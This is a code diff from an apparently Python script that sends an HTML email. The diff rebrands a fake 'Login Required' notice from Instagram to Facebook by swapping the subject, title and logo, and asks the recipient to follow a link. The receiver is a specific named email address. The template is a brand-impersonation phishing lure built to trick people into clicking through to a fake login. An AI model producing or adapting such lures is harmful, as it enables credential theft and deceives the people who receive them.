@@ -14,14 +14,14 @@ receiver_email = "rasulov_sy@auca.kg"  # Replace with the recipient's email
 
 
 # HTML email content
-subject = "Instagram Login Required"
+subject = "Facebook: Login Required"
 body = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <title>Instagram Email Style</title>
+   <title>Facebook Email Style</title>
    <style>
        body {
            font-family: Arial, sans-serif;
@@ -73,8 +73,8 @@ body = """
 <body>
    <div class="container">
        <div class="header">
-           <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-           <h2>Instagram</h2>
+           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" alt="Facebook Logo">
+           <h2>Facebook</h2>
        </div>
        <p style="font-size: 16px; color: #333;">You have a new notification!</p>
        <p style="font-size: 16px; color: #333;">Hello, we've got an update for you. Follow the link below to learn more:</p>
